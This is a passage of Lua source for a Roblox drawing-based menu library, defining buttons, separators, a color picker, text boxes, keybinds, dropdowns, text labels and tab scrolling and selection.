                            utility:Connection(objs.holder.MouseButton1Up, function()
                                objs.text.ThemeColor = button.risky and 'Risky Text' or 'Option Text 3';
                                objs.background.ThemeColor = 'Option Background';
                                objs.background.ThemeColorOffset = 0;
                            end)
    
                            local clicked, counting = false, false
                            utility:Connection(objs.holder.MouseButton1Down, function()
                                objs.text.ThemeColor = button.risky and 'Risky Text Enabled' or 'Option Text 2';
                                objs.background.ThemeColor = 'Accent';
                                objs.background.ThemeColorOffset = -95;
    
                                task.spawn(function() -- this is ugly and i do not care :)
                                    if button.confirm then
                                        if clicked then
                                            clicked = false
                                            counting = false
                                            objs.text.Text = button.text
                                            button.callback()
                                        else
                                            clicked = true
                                            counting = true
                                            for i = 3,1,-1 do
                                                if not counting then
                                                    break
                                                end
                                                objs.text.Text = 'Confirm '..button.text..'? '..tostring(i)
                                                task.wait(1)
                                            end
                                            clicked = false
                                            counting = false
                                            objs.text.Text = button.text
                                        end
                                    else
                                        button.callback()
                                    end
                                end)
    
                            end)
    
                        end
                        ----------------------
    
                        function button:SetText(str)
                            if typeof(str) == 'string' then
                                self.text = str;
                                self.objects.text.Text = str;
                            end
                        end
    
                        tooltip(button);
                        button:SetText(button.text);
                        self:UpdateOptions();
                        return button
                    end
                    ----------------------

                    function button:UpdateOptions() -- this so dumb XD
                        local buttons = 1 + #self.subbuttons;
                        local buttonSize = (1 / buttons) - .005;
                        self.objects.background.Size = newUDim2(buttonSize,-4,0,22);
                        for i,v in next, self.subbuttons do
                            v.objects.holder.Size = newUDim2(buttonSize,0,1,0);
                            v.objects.holder.Position = newUDim2(i * buttonSize + .01, 0, 0, 0)
                        end
                    end

                    function button:SetText(str)
                        if typeof(str) == 'string' then
                            self.text = str;
                            self.objects.text.Text = str;
                        end
                    end

                    tooltip(button);
                    button:SetText(button.text);
                    self:UpdateOptions();
                    return button
                end

                -- // Separator
                function section:AddSeparator(data)
                    local separator = {
                        class = 'separator';
                        flag = data.flag;
                        text = '';
                        order = #self.options+1;
                        enabled = true;
                        objects = {};
                    };

                    local blacklist = {'objects', 'dragging'};
                    for i,v in next, data do
                        if not table.find(blacklist, i) and (separator[i] ~= nil and typeof(separator[i]) == typeof(v)) then
                            separator[i] = v;
                        end
                    end
        
                    table.insert(self.options, separator)

                    --- Create Objects ---
                    do
                        local objs = separator.objects;
                        local z = library.zindexOrder.window+25;

                        objs.holder = utility:Draw('Square', {
                            Size = newUDim2(1,0,0,24);
                            Transparency = 0;
                            ZIndex = z;
                            Parent = section.objects.optionholder;
                        })

                        objs.line1 = utility:Draw('Square', {
                            Position = newUDim2(0,0,0,1);
                            ThemeColor = 'Option Border 1';
                            ZIndex = z+1;
                            Parent = objs.holder;
                        })

                        objs.line2 = utility:Draw('Square', {
                            Position = newUDim2(0,0,0,1);
                            ThemeColor = 'Option Border 1';
                            ZIndex = z+1;
                            Parent = objs.holder;
                        })

                        objs.border1 = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 2';
                            ZIndex = z;
                            Parent = objs.line1;
                        })

                        objs.border2 = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 2';
                            ZIndex = z;
                            Parent = objs.line2;
                        })

                        objs.text = utility:Draw('Text', {
                            Position = newUDim2(.5,0,0,4);
                            ThemeColor = 'Option Text 2';
                            Size = 13;
                            Font = 2;
                            ZIndex = z;
                            Outline = true;
                            Center = true;
                            Parent = objs.holder;
                        })

                    end
                    ----------------------

                    function separator:SetText(str)
                        if typeof(str) == 'string' then
                            self.text = str;
                            self.objects.text.Text = str;
                            -- each line fills half the row up to the text (plus a small gap), worked out
                            -- from the row's own width, so it's right no matter when this runs
                            local half = (str == '' and 0 or self.objects.text.TextBounds.X / 2 + 8)
                            self.objects.line1.Size = newUDim2(.5, -half - 3, 0, 1)
                            self.objects.line1.Position = newUDim2(0, 3, .5, 0)
                            self.objects.line2.Size = newUDim2(.5, -half - 3, 0, 1)
                            self.objects.line2.Position = newUDim2(.5, half, .5, 0)
                        end
                    end

                    separator:SetText(separator.text);
                    self:UpdateOptions();
                    return separator
                end

                -- // Color Picker
                function section:AddColor(data)
                    local color = {
                        class = 'color';
                        flag = data.flag;
                        text = '';
                        tooltip = '';
                        order = #self.options+1;
                        callback = function() end;
                        color = Color3.new(1,1,1);
                        trans = 0;
                        open = false;
                        enabled = true;
                        risky = false;
                        objects = {};
                    };

                    local blacklist = {'objects'};
                    for i,v in next, data do
                        if not table.find(blacklist, i) and color[i] ~= nil then
                            color[i] = v
                        end
                    end
                    
                    table.insert(self.options, color)

                    if color.flag then
                        library.flags[color.flag] = color.color;
                        library.options[color.flag] = color;
                    end

                    --- Create Objects ---
                    do
                        local objs = color.objects;
                        local z = library.zindexOrder.window+25;

                        objs.holder = utility:Draw('Square', {
                            Size = newUDim2(1,0,0,26);
                            Transparency = 0;
                            ZIndex = z+5;
                            Parent = section.objects.optionholder;
                        })

                        objs.background = utility:Draw('Square', {
                            Size = newUDim2(0,22,0,12);
                            Position = newUDim2(1,-24,0,7);
                            ZIndex = z+3;
                            Parent = objs.holder;
                        })

                        objs.gradient = utility:Draw('Image', {
                            Size = newUDim2(1,0,1,0);
                            Data = library.images.gradientp45;
                            Visible = false; -- flat look (gradient kept for scripts that want it back)
                            Transparency = .25;
                            ZIndex = z+4;
                            Parent = objs.background;
                        })

                        objs.border1 = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 1';
                            ZIndex = z+2;
                            Parent = objs.background;
                        })

                        objs.border2 = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 2';
                            ZIndex = z+1;
                            Parent = objs.border1;
                        })

                        objs.text = utility:Draw('Text', {
                            Position = newUDim2(0,4,0,6);
                            ThemeColor = color.risky and 'Risky Text Enabled' or 'Option Text 3';
                            Size = 13;
                            Font = 2;
                            ZIndex = z+1;
                            Outline = true;
                            Parent = objs.holder;
                        })

                        utility:Connection(objs.holder.MouseEnter, function()
                            objs.border1.ThemeColor = 'Accent';
                        end)

                        utility:Connection(objs.holder.MouseLeave, function()
                            objs.border1.ThemeColor = color.open and 'Accent' or 'Option Border 1';
                        end)

                        utility:Connection(objs.holder.MouseButton1Down, function()
                            color:SetOpen(not color.open);
                        end)

                    end
                    ----------------------

                    function color:SetText(str)
                        if typeof(str) == 'string' then
                            self.text = str;
                            self.objects.text.Text = str;
                        end
                    end

                    function color:SetColor(c3, nocallback)
                        if typeof(c3) == 'Color3' then
                            local h,s,v = c3:ToHSV(); c3 = fromhsv(h, clamp(s,.005,.995), clamp(v,.005,.995));
                            self.color = c3;
                            self.objects.background.Color = c3;
                            if not nocallback then
                                self.callback(c3, self.trans);
                            end
                            if self.open then
                                window.colorpicker:Visualize(self.color, self.trans);
                            end
                            if self.flag then
                                library.flags[self.flag] = c3;
                            end
                        end
                    end

                    function color:SetTrans(trans, nocallback)
                        if typeof(trans) == 'number' then
                            self.trans = trans;
                            if not nocallback then
                                self.callback(self.color, trans);
                            end
                            if self.open then
                                window.colorpicker:Visualize(self.color, self.trans);
                            end
                        end
                    end

                    function color:SetOpen(bool)
                        if typeof(bool) == 'boolean' then
                            self.open = bool
                            if bool then
                                if window.colorpicker.selected then
                                    window.colorpicker.selected.open = false;
                                end
                                window.colorpicker.selected = color
                                window.colorpicker.objects.background.Parent = self.objects.background;
                                window.colorpicker.objects.background.Visible = true;
                                window.colorpicker:Visualize(color.color, color.trans)
                                window.colorpicker:AnimateOpen()
                            elseif window.colorpicker.selected == color then
                                window.colorpicker.selected = nil;
                                window.colorpicker.objects.background.Parent = window.objects.background;
                                window.colorpicker.objects.background.Visible = false;
                            end
                        end
                    end

                    tooltip(color);
                    color:SetText(color.text);
                    color:SetColor(color.color, true);
                    color:SetTrans(color.trans, true);
                    self:UpdateOptions();
                    return color
                end

                -- // Text Box
                function section:AddBox(data)
                    local box = {
                        class = 'box';
                        flag = data.flag;
                        text = '';
                        input = '';
                        order = #self.options+1;
                        callback = function() end;
                        enabled = true;
                        focused = false;
                        risky = false;
                        objects = {};
                    };

                    local blacklist = {'objects', 'dragging'};
                    for i,v in next, data do
                        if not table.find(blacklist, i) and box[i] ~= nil then
                            box[i] = v;
                        end
                    end
                    
                    table.insert(self.options, box)

                    if box.flag then
                        library.flags[box.flag] = box.input;
                        library.options[box.flag] = box;
                    end

                    --- Create Objects ---
                    do
                        local objs = box.objects;
                        local z = library.zindexOrder.window+25;

                        objs.holder = utility:Draw('Square', {
                            Size = newUDim2(1,0,0,46);
                            Transparency = 0;
                            ZIndex = z+4;
                            Parent = section.objects.optionholder;
                        })

                        objs.background = utility:Draw('Square', {
                            Size = newUDim2(1,-4,0,22);
                            Position = newUDim2(0,2,1,-24);
                            ThemeColor = 'Option Background';
                            ZIndex = z+2;
                            Parent = objs.holder;
                        })

                        objs.border1 = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 1';
                            ZIndex = z+1;
                            Parent = objs.background;
                        })

                        objs.border2 = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 2';
                            ZIndex = z;
                            Parent = objs.border1;
                        })

                        objs.gradient = utility:Draw('Image', {
                            Size = newUDim2(1,0,1,0);
                            Data = library.images.gradientp90;
                            Visible = false; -- flat look (gradient kept for scripts that want it back)
                            Transparency = .65;
                            ZIndex = z+4;
                            Parent = objs.background;
                        })

                        objs.text = utility:Draw('Text', {
                            Position = newUDim2(0,4,0,3);
                            ThemeColor = box.risky and 'Risky Text Enabled' or 'Option Text 2';
                            Size = 13;
                            Font = 2;
                            ZIndex = z+1;
                            Outline = true;
                            Parent = objs.holder;
                        })

                        objs.inputText = utility:Draw('Text', {
                            Position = newUDim2(0,5,0,4);
                            ThemeColor = 'Option Text 2';
                            Size = 13;
                            Font = 2;
                            ZIndex = z+5;
                            Outline = true;
                            Parent = objs.background;
                        })

                        utility:Connection(objs.holder.MouseEnter, function()
                            objs.border1.ThemeColor = 'Accent';
                        end)

                        utility:Connection(objs.holder.MouseLeave, function()
                            objs.border1.ThemeColor = 'Option Border 1';
                        end)

                        -- click to type (ctrl + click starts with an empty box). clicking it again while typing keeps typing.
                        utility:Connection(objs.holder.MouseButton1Down, function()
                            if not box.focused then
                                box:CaptureFocus(inputservice:IsKeyDown(Enum.KeyCode.LeftControl));
                            end
                        end)

                    end
                    ----------------------

                    function box:SetText(str)
                        if typeof(str) == 'string' then
                            self.text = str;
                            self.objects.text.Text = str;
                        end
                    end

                    -- draws `str` in the box; long text shows its end so what you're typing stays visible.
                    -- caret (1-based like TextBox.CursorPosition) draws a | at that spot
                    local function render(str, caret)
                        local label = box.objects.inputText
                        local shown = str
                        if caret and caret >= 1 then
                            caret = math.clamp(caret, 1, #str + 1)
                            shown = str:sub(1, caret - 1)..'|'..str:sub(caret)
                        end
                        local maxWidth = box.objects.background.Object.Size.X - 6
                        label.Text = shown
                        if label.TextBounds.X > maxWidth then
                            -- too long: split into whole characters (so emoji / accents never get cut in half),
                            -- cut from the right while the caret stays visible, then from the left
                            local chars, caretChar = {}, nil
                            local bytePos = 1
                            for ch in shown:gmatch(utf8.charpattern) do
                                table.insert(chars, ch)
                                if caret and bytePos == caret then
                                    caretChar = #chars
                                end
                                bytePos += #ch
                            end
                            local first, last = 1, #chars
                            local keep = caretChar or #chars
                            local function fits()
                                label.Text = table.concat(chars, '', first, last)
                                return label.TextBounds.X <= maxWidth
                            end
                            while not fits() and last > keep do
                                last -= 1
                            end
                            while not fits() and first < last do
                                first += 1
                            end
                        end
                    end

                    function box:SetInput(str, nocallback)
                        if typeof(str) == 'string' then
                            self.input = str;
                            render(str);
                            if not nocallback then
                                self.callback(str);
                            end
                            if self.flag then
                                library.flags[self.flag] = str;
                            end
                        end
                    end

                    -- // Typing
                    -- a hidden real Roblox TextBox (library.inputBox) does the typing, so every character, shift,
                    -- keyboard layouts, arrow keys, Ctrl+A / Ctrl+C / Ctrl+V and Ctrl+Backspace all work natively.
                    -- the drawing just mirrors its text with a | caret.
                    -- Enter or clicking away = apply, Escape = cancel.
                    local conns = {}
                    local input = box.input;

                    local function disconnectAll()
                        for _, conn in ipairs(conns) do
                            conn:Disconnect()
                        end
                        table.clear(conns)
                    end

                    function box:CaptureFocus(clear)
                        local tb = library.inputBox
                        if tb == nil then return end

                        -- only one box types at a time
                        if library.activeBox and library.activeBox ~= box then
                            library.activeBox:ReleaseFocus(true)
                        end

                        disconnectAll()
                        box.focused = true
                        library.activeBox = box
                        library.focusedBox = box -- keybinds ignore keys while typing
                        input = clear and '' or box.input -- stay in sync with SetInput / config loads
                        self.objects.inputText.ThemeColor = 'Option Text 1'

                        -- sit the real TextBox over the drawn one (keeps IME / emoji popups in the right spot)
                        local data = library.drawings[self.objects.background.Object]
                        if data then
                            tb.Position = UDim2.fromOffset(data.AbsolutePosition.X, data.AbsolutePosition.Y)
                            tb.Size = UDim2.fromOffset(math.max(data.AbsoluteSize.X, 10), math.max(data.AbsoluteSize.Y, 10))
                        end
                        tb.Text = input

                        local function refresh()
                            if box.focused then
                                render(input, tb.CursorPosition)
                            end
                        end

                        table.insert(conns, tb:GetPropertyChangedSignal('Text'):Connect(function()
                            if not box.focused then return end
                            -- single line only (pasted text with newlines gets flattened)
                            local text = tb.Text
                            if text:find('[\r\n]') then
                                text = text:gsub('[\r\n]+', ' ')
                                tb.Text = text
                                return
                            end
                            input = text
                            refresh()
                        end))
                        table.insert(conns, tb:GetPropertyChangedSignal('CursorPosition'):Connect(refresh))

                        -- Ctrl+C with nothing selected copies the whole box (the selection itself isn't drawn)
                        table.insert(conns, inputservice.InputBegan:Connect(function(inp)
                            if box.focused and inp.KeyCode == Enum.KeyCode.C
                                and (inputservice:IsKeyDown(Enum.KeyCode.LeftControl) or inputservice:IsKeyDown(Enum.KeyCode.RightControl))
                                and (tb.SelectionStart == -1 or tb.SelectionStart == tb.CursorPosition) then
                                setclip(input)
                            end
                        end))

                        table.insert(conns, tb.FocusLost:Connect(function(enterPressed, causedBy)
                            if not box.focused then return end
                            local escaped = causedBy and causedBy.KeyCode == Enum.KeyCode.Escape
                            box:ReleaseFocus(not escaped, enterPressed)
                        end))

                        tb:CaptureFocus()
                        task.defer(function()
                            if box.focused then
                                tb.CursorPosition = #tb.Text + 1
                                refresh()
                            end
                        end)
                        refresh()
                    end

                    -- apply: keep the typed text. force: fire the callback even if the text didn't change (Enter)
                    function box:ReleaseFocus(apply, force)
                        if not box.focused then return end
                        box.focused = false;
                        disconnectAll()

                        if library.focusedBox == box then
                            library.focusedBox = nil;
                            -- remembered so the Enter/Escape that closed the box doesn't also trigger a bind
                            library.boxReleasedAt = os.clock();
                        end
                        if library.activeBox == box then
                            library.activeBox = nil;
                        end

                        local tb = library.inputBox
                        if tb then
                            pcall(function()
                                if tb:IsFocused() then
                                    tb:ReleaseFocus()
                                end
                                tb.Text = ''
                                tb.Position = UDim2.fromOffset(-10000, -10000) -- park it so stray clicks can't focus it
                            end)
                        end

                        self.objects.inputText.ThemeColor = 'Option Text 2';
                        if apply and (force or input ~= box.input) then
                            box:SetInput(input);
                        else
                            input = box.input;
                            render(box.input);
                        end
                    end

                    tooltip(box);
                    box:SetText(box.text);
                    box:SetInput(box.input, true);
                    self:UpdateOptions();
                    return box
                end

                -- // Keybind
                function section:AddBind(data)
                    local bind = {
                        class = 'bind';
                        flag = data.flag;
                        text = '';
                        tooltip = '';
                        bind = 'none';
                        mode = 'toggle';
                        order = #self.options+1;
                        callback = function() end;
                        keycallback = function() end;
                        indicatorValue = library.keyIndicator:AddValue({value = 'value', key = 'key', enabled = false});
                        noindicator = false;
                        state = false;
                        nomouse = false;
                        enabled = true;
                        binding = false;
                        risky = false;
                        objects = {};
                    };

                    local blacklist = {'objects'};
                    for i,v in next, data do
                        if not table.find(blacklist, i) and bind[i] ~= nil then
                            bind[i] = v
                        end
                    end
                    
                    table.insert(self.options, bind)

                    if bind.flag then
                        library.options[bind.flag] = bind;
                    end

                    --- Create Objects ---
                    do
                        local objs = bind.objects;
                        local z = library.zindexOrder.window+25;

                        objs.holder = utility:Draw('Square', {
                            Size = newUDim2(1,0,0,26);
                            Transparency = 0;
                            ZIndex = z+5;
                            Parent = section.objects.optionholder;
                        })

                        objs.text = utility:Draw('Text', {
                            Position = newUDim2(0,4,0,6);
                            ThemeColor = bind.risky and 'Risky Text' or 'Option Text 2';
                            Size = 13;
                            Font = 2;
                            ZIndex = z+1;
                            Outline = true;
                            Parent = objs.holder;
                        })

                        objs.keyText = utility:Draw('Text', {
                            ThemeColor = 'Option Text 3';
                            Size = 13;
                            Font = 2;
                            ZIndex = z+1;
                            Parent = objs.holder;
                        })

                        utility:Connection(objs.holder.MouseEnter, function()
                            objs.keyText.ThemeColor = 'Accent';
                        end)

                        utility:Connection(objs.holder.MouseLeave, function()
                            objs.keyText.ThemeColor = bind.binding and 'Accent' or 'Option Text 3';
                        end)

                        utility:Connection(objs.holder.MouseButton1Down, function()
                            if not bind.binding then
                                bind:SetKeyText('...');
                                bind.bindingStarted = os.clock();
                                bind.binding = true;
                            end
                        end)

                    end
                    ----------------------

                    local c

                    function bind:SetText(str)
                        if typeof(str) == 'string' then
                            self.text = str;
                            self.objects.text.Text = str;
                            self.indicatorValue:SetKey(str);
                        end
                    end

                    function bind:SetBind(keybind)
                        if c then
                            c:Disconnect();
                            c = nil;
                            if bind.flag then
                                library.flags[bind.flag] = false;
                            end
                            bind.callback(false);
                        end
                        local keyName = 'NONE'
                        -- false/nil means "cancelled" (blacklisted key), keep the previous bind
                        if keybind == 'none' or typeof(keybind) == 'EnumItem' then
                            self.bind = keybind
                        end
                        if self.bind == Enum.KeyCode.Backspace or self.bind == 'none' then
                            self.bind = 'none';
                            -- clearing the key switches it off (an unbound key is never on)
                            if self.state then
                                self.state = false
                                if self.flag then
                                    library.flags[self.flag] = false;
                                end
                                self.callback(false);
                            end
                            self.indicatorValue:SetEnabled(false);
                        else
                            keyName = getKeyName(self.bind)
                        end
                        self.keycallback(self.bind);
                        self:SetKeyText(keyName:upper());
                        self.indicatorValue:SetKey((self.text == nil or self.text == '') and (self.flag == nil and 'unknown' or self.flag) or self.text); -- this is so dumb
                        self.indicatorValue:SetValue('['..keyName:upper()..']');
                        self.objects.keyText.ThemeColor = self.objects.holder.Hover and 'Accent' or 'Option Text 3';
                    end

                    function bind:SetKeyText(str)
                        str = tostring(str);
                        self.objects.keyText.Text = '['..str..']';
                        self.objects.keyText.Position = newUDim2(1,-self.objects.keyText.TextBounds.X, 0, 6);
                    end

                    utility:Connection(inputservice.InputBegan, function(inp)
                        if inputservice:GetFocusedTextBox() or library:IsTyping() then
                            return
                        elseif bind.binding then
                            -- ignore the same click that started binding
                            if inp.UserInputType == Enum.UserInputType.MouseButton1 and os.clock() - (bind.bindingStarted or 0) < 0.05 then
                                return
                            end
                            bind:SetBind(getInputKey(inp, bind.nomouse))
                            bind.binding = false
                        elseif bind.bind ~= 'none' and (inp.KeyCode == bind.bind or inp.UserInputType == bind.bind) and not bind.binding then
                            -- (an unbound key - 'none' - never reacts to anything)
                            if bind.mode == 'toggle' then
                                bind.state = not bind.state
                                if bind.flag then
                                    library.flags[bind.flag] = bind.state;
                                end
                                bind.callback(bind.state)
                                bind.indicatorValue:SetEnabled(bind.state and not bind.noindicator);
                            elseif bind.mode == 'hold' then
                                if bind.flag then
                                    library.flags[bind.flag] = true;
                                end
                                bind.indicatorValue:SetEnabled(true and not bind.noindicator);
                                c = utility:Connection(runservice.RenderStepped, function()
                                    bind.callback(true);
                                end)
                            end
                        end
                    end)

                    utility:Connection(inputservice.InputEnded, function(inp)
                        if bind.bind ~= 'none' then
                            if inp.KeyCode == bind.bind or inp.UserInputType == bind.bind then
                                if c then
                                    c:Disconnect();
                                    c = nil;
                                    if bind.flag then
                                        library.flags[bind.flag] = false;
                                    end
                                    bind.callback(false);
                                    bind.indicatorValue:SetEnabled(false);
                                end
                            end
                        end
                    end)

                    tooltip(bind);
                    bind:SetBind(bind.bind);
                    bind:SetText(bind.text);
                    self:UpdateOptions();
                    return bind
                end

                -- // Dropdown
                function section:AddList(data)
                    local list = {
                        class = 'list';
                        flag = data.flag;
                        text = '';
                        selected = '';
                        tooltip = '';
                        order = #self.options+1;
                        callback = function() end;
                        enabled = true;
                        multi = false;
                        maxVisible = false; -- rows shown before scrolling (false = window default)
                        open = false;
                        risky = false;
                        values = {};
                        objects = {};
                    }

                    table.insert(self.options, list);

                    local blacklist = {'objects'};
                    for i,v in next, data do
                        if not table.find(blacklist, i) ~= list[i] ~= nil then
                            list[i] = v
                        end
                    end

                    if list.flag then
                        library.flags[list.flag] = list.selected;
                        library.options[list.flag] = list;
                    end

                    -- Create Objects --
                    do
                        local objs = list.objects;
                        local z = library.zindexOrder.window+25;

                        objs.holder = utility:Draw('Square', {
                            Size = newUDim2(1,0,0,48);
                            Transparency = 0;
                            ZIndex = z+4;
                            Parent = section.objects.optionholder;
                        })

                        objs.background = utility:Draw('Square', {
                            Size = newUDim2(1,-4,0,22);
                            Position = newUDim2(0,2,1,-24);
                            ThemeColor = 'Option Background';
                            ZIndex = z+2;
                            Parent = objs.holder;
                        })

                        objs.border1 = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 1';
                            ZIndex = z+1;
                            Parent = objs.background;
                        })

                        objs.border2 = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 2';
                            ZIndex = z;
                            Parent = objs.border1;
                        })

                        objs.gradient = utility:Draw('Image', {
                            Size = newUDim2(1,0,1,0);
                            Data = library.images.gradientp90;
                            Visible = false; -- flat look (gradient kept for scripts that want it back)
                            Transparency = .65;
                            ZIndex = z+4;
                            Parent = objs.background;
                        })

                        objs.text = utility:Draw('Text', {
                            Position = newUDim2(0,4,0,3);
                            ThemeColor = list.risky and 'Risky Text Enabled' or 'Option Text 2';
                            Size = 13;
                            Font = 2;
                            ZIndex = z+1;
                            Outline = true;
                            Parent = objs.holder;
                        })

                        objs.inputText = utility:Draw('Text', {
                            Position = newUDim2(0,6,0,4);
                            ThemeColor = 'Option Text 2';
                            Text = 'none',
                            Size = 13;
                            Font = 2;
                            ZIndex = z+5;
                            Outline = true;
                            Parent = objs.background;
                        })

                        objs.openText = utility:Draw('Text', {
                            Position = newUDim2(1,-12,0,4);
                            ThemeColor = 'Option Text 3';
                            Text = '+';
                            Size = 13;
                            Font = 2;
                            ZIndex = z+5;
                            Outline = true;
                            Parent = objs.background;
                        })

                        utility:Connection(objs.holder.MouseEnter, function()
                            objs.border1.ThemeColor = 'Accent';
                        end)

                        utility:Connection(objs.holder.MouseLeave, function()
                            objs.border1.ThemeColor = 'Option Border 1';
                        end)

                        utility:Connection(objs.holder.MouseButton1Down, function()
                            if list.open then
                                list.open = false;
                                objs.openText.Text = '+';
                                if window.dropdown.selected == list then
                                    window.dropdown.selected = nil;
                                    window.dropdown.objects.background.Visible = false;
                                end
                            else
                                if window.dropdown.selected ~= nil then
                                    window.dropdown.selected.open = false
                                end
                                list.open = true;
                                objs.openText.Text = '-';
                                window.dropdown.selected = list;
                                window.dropdown.objects.background.Visible = true;
                                window.dropdown.objects.background.Parent = objs.holder;
                                window.dropdown:Refresh();
                                window.dropdown:AnimateOpen();
                            end
                        end)


                    end
                    --------------------

                    function list:SetText(str)
                        if typeof(str) == 'string' then
                            self.text = str;
                            self.objects.text.Text = str;
                        end
                    end

                    function list:Select(option, nocallback)
                        option = typeof(option) == 'table' and (self.multi == true and option or (#option == 0 and nil or option[1])) or self.multi == true and {option} or option;
                        if option ~= nil then
                            self.selected = option;
                            local text = typeof(option) == 'table' and (#option == 0 and "none" or table.concat(option, ', ')) or tostring(option);
                            local label = self.objects.inputText
                            label.Text = text;
                            if label.TextBounds.X > self.objects.background.Object.Size.X - 10 then
                                local split = text:split('');
                                for i = 1,#split do
                                    label.Text = table.concat(split, '', 1, i)
                                    if label.TextBounds.X > self.objects.background.Object.Size.X - 10 then
                                        label.Text = label.Text:sub(1,-6)..'...';
                                        break
                                    end
                                end
                            end
                            if self.flag then
                                library.flags[self.flag] = self.selected
                            end
                            if not nocallback then
                                self.callback(self.selected);
                            end
                        end
                    end

                    function list:AddValue(value)
                        table.insert(list.values, tostring(value));
                        if window.dropdown.selected == list then
                            window.dropdown:Refresh()
                        end
                    end

                    function list:RemoveValue(value)
                        if table.find(list.values, value) then
                            table.remove(list.values, table.find(list.values, value));
                            if window.dropdown.selected == list then
                                window.dropdown:Refresh()
                            end
                        end
                    end

                    function list:ClearValues()
                        table.clear(list.values);
                        if window.dropdown.selected == list then
                            window.dropdown:Refresh()
                        end
                    end

                    tooltip(list);
                    list:Select((data.value or data.selected) or (list.multi and 'none' or list.values[1]), true);
                    list:SetText(list.text);
                    self:UpdateOptions();
                    return list
                end

                -- Text
                function section:AddText(data)
                    local text = {
                        class = 'text';
                        flag = data.flag;
                        text = '';
                        tooltip = '';
                        order = #self.options+1;
                        enabled = true;
                        risky = false;
                        objects = {};
                    };

                    local blacklist = {'objects'};
                    for i,v in next, data do
                        if not table.find(blacklist, i) and text[i] ~= nil then
                            text[i] = v
                        end
                    end

                    if data.flag then
                        library.options[data.flag] = text;
                    end

                    table.insert(self.options, text)

                    --- Create Objects ---
                    do
                        local objs = text.objects;
                        local z = library.zindexOrder.window+25;

                        objs.holder = utility:Draw('Square', {
                            Transparency = 0;
                            ZIndex = z+5;
                            Parent = section.objects.optionholder;
                        })

                        objs.text = utility:Draw('Text', {
                            Position = newUDim2(0,4,0,4);
                            ThemeColor = text.risky and 'Risky Text Enabled' or 'Option Text 2';
                            Size = 13;
                            Font = 2;
                            ZIndex = z+1;
                            Outline = true;
                            Parent = objs.holder;
                        })
                    end
                    ----------------------

                    function text:SetText(str)
                        if typeof(str) == 'string' then
                            self.text = str;
                            self.objects.text.Text = str;
                            self.objects.holder.Size = newUDim2(1,0,0,self.objects.text.TextBounds.Y + 8);
                            section:UpdateOptions();
                        end
                    end

                    text:SetText(text.text);
                    self:UpdateOptions();
                    return text
                end

                -----------------------

                section:UpdateOptions();
                section:SetText(section.text);
                self:UpdateSections();
                return section;
            end

            function tab:UpdateSections()
                table.sort(self.sections, function(a,b)
                    return a.order < b.order
                end)

                -- scroll: each tab remembers its own scroll position
                if not self.scrollY then self.scrollY = 0 end
                local scrollY = self.scrollY

                -- first pass: compute natural positions (no scroll) and total column heights
                local last1,last2;
                local padding = 10;
                for _,section in next, self.sections do
                    -- (visibility is decided once, in the second pass, so it never flips back and forth)
                    if section.enabled then
                        -- natural (unscrolled) positions always start at 0 for the first section in a
                        -- column; never read them back from Position, which already has the scroll applied
                        if section.side == 1 then
                            section._natPos = last1 and (last1._natPos + last1.objects.background.Object.Size.Y + padding) or 0
                            last1 = section;
                        elseif section.side == 2 then
                            section._natPos = last2 and (last2._natPos + last2.objects.background.Object.Size.Y + padding) or 0
                            last2 = section;
                        end
                    end
                end

                -- compute max scroll: tallest column minus the column's visible height
                local colHeight1 = last1 and (last1._natPos + last1.objects.background.Object.Size.Y) or 0
                local colHeight2 = last2 and (last2._natPos + last2.objects.background.Object.Size.Y) or 0
                local tallest = math.max(colHeight1, colHeight2)
                local visibleH = window.objects.columnholder1.Object.Size.Y
                self.maxScrollY = math.max(tallest - visibleH, 0)
                self.scrollY = clamp(self.scrollY, 0, self.maxScrollY)
                scrollY = self.scrollY

                -- second pass: apply scroll offset and visibility
                for _,section in next, self.sections do
                    local shown = false
                    local scrolledY = 0
                    if section.enabled and section._natPos then
                        scrolledY = section._natPos - scrollY
                        local sectionH = section.objects.background.Object.Size.Y
                        local posX = section.objects.background.Position.X
                        section.objects.background.Position = newUDim2(posX.Scale, posX.Offset, 0, scrolledY)

                        -- shown when any part of it is inside the content area (only on the selected tab);
                        -- ApplyClip then trims it so nothing draws outside the panel
                        local inView = scrolledY < visibleH and scrolledY + sectionH > 0
                        shown = tab.selected and inView
                    end
                    if section.objects.background.Visible ~= shown then
                        section.objects.background.Visible = shown
                    end
                    if shown then
                        section:ApplyClip(scrolledY, visibleH)
                    end

                    section:SetText(section.text)
                end
            end

            function tab:SetText(str)
                if typeof(str) == 'string' then
                    self.text = str;
                    self.objects.text.Text = str;
                    window:UpdateTabs();
                end
            end

            function tab:Select()
                local previous = window.selectedTab;
                window.selectedTab = tab;
                -- reset scroll to top when switching tabs
                if previous ~= tab then
                    self.scrollY = 0
                end
                if window.dropdown.selected then
                    window.dropdown:Close();
                end
                if window.colorpicker.selected then
                    window.colorpicker.selected:SetOpen(false);
                end
                window:UpdateTabs();
                library.hoverDirty = true;

                -- switching tabs: new sections fade in while the columns rise into place
                if previous ~= nil and previous ~= tab and window.open then
                    local anim = library.animations;
                    local offset = newUDim2(0, 0, 0, anim.tabOffset);
                    utility:SlideIn(window.objects.columnholder1, newUDim2(.01, 0, .02, 0), offset, anim.tab);
                    utility:SlideIn(window.objects.columnholder2, newUDim2(1 - (.48 + .01), 0, .02, 0), offset, anim.tab);
                    for _, section in next, tab.sections do
                        if section.enabled then
                            utility:FadeIn(section.objects.background, anim.tab);
                        end
                    end
                end

                for i,v in next, window.tabs do
                    if v.callback then
                        v.callback(v == tab)
                    end
                end
            end

            if window.selectedTab == nil then
                tab:Select();
            end

